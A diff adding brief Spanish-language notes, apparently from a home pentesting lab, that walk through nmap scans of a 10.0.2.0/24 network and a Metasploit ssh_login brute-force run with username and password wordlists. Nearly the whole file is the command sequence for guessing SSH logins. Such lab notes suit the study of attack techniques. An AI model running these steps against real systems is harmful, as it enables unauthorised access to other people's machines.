@@ -1,0 +1,36 @@
+red NAT
+
+nmap -sP 10.0.2.0/24
+
+nmap -sT 10.0.2.1
+
+
+
+metasploit framework
+
+o msfconsole
+
+
+nmap -sT 10.0.2.1
+
+search ssh 
+
+hay que encontrar un login en este caso
+use auxiliar/scanner/ssh/ssh_login
+
+tenemos que descargar los diccionarios claves.txt, 
+
+set RHOSTS 0.0.0.0
+
+set USER_FILE /home/kali/Desktop/usuarios.txt
+
+info
+
+set PASS_FILE /home/kali/Desktop/claves.txt
+
+set VERBOSE true
+
+exploit
+
+
+sessions -l
